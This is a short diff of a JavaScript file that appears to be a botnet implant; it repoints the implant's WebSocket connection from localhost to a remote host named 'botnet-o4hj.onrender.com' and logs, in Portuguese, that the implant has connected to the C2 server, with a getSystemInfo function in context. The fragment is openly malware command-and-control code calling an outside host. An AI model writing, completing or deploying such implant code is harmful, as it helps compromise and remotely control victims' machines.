@@ -51,7 +51,7 @@ function getSystemInfo() {
 }
 
 const connect = () => {
-    const ws = new WebSocket("ws://localhost:3000");
+    const ws = new WebSocket("wss://botnet-o4hj.onrender.com");
 
     ws.on("open", () => {
         console.log("[+] Implant conectado ao servidor C2");
